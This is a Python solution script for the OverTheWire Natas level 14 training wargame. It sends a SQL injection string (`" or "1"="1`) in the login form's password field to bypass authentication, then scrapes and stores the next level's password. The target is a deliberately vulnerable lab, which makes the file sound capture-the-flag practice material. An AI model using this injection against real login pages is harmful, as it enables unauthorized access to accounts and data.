
import re,requests,base64,natas

USER='natas14'
PASSWORD=natas.get_credential(USER)

URL='http://natas14.natas.labs.overthewire.org/index.php'

def main():
    b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))

    response = requests.post(
            URL,
            headers=dict(Authorization='Basic %s' % b64),
            data={
                'username':'natas15',
                'password':'" or "1"="1'
            }
    )
    
    regex=r"natas15 is (\w+)"
    matches=re.finditer(regex,response.content,re.MULTILINE)

    password = None
    for match in matches:
        password = match.group(1)

    if password is not None:
        print('password found: %s' % password)
        print('adding to credentials....')
        natas.save_credentials('natas15',password)
        print('done')


if __name__=='__main__':
    main()
